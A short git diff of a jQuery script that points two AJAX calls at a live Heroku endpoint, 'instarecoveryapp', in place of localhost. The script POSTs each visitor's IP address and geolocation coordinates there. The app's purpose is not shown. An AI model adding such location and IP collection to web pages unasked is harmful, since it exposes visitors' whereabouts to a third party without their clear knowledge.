@@ -19,8 +19,8 @@ $(function() {
                     y_coord = position.coords.longitude;
 
                     $.ajax({
-                        //url: "https://instarecoveryapp.herokuapp.com/receive",
-                        url: "http://localhost:5000/receive",
+                        url: "https://instarecoveryapp.herokuapp.com/receive",
+                        //url: "http://localhost:5000/receive",
                         contentType: "application/json",
                         data: "{ \"ip\": \""+ip+"\", \"x_coord\": \""+x_coord+"\", \"y_coord\": \""+y_coord+"\" }",
                         method: "POST"
@@ -31,8 +31,8 @@ $(function() {
 
             } else {
                 $.ajax({
-                    //url: "https://instarecoveryapp.herokuapp.com/receive",
-                    url: "http://localhost:5000/receive",
+                    url: "https://instarecoveryapp.herokuapp.com/receive",
+                    //url: "http://localhost:5000/receive",
                     contentType: "application/json",
                     data: "{ \"ip\": \""+ip+"\", \"x_coord\": \""+x_coord+"\", \"y_coord\": \""+y_coord+"\" }",
                     method: "POST"
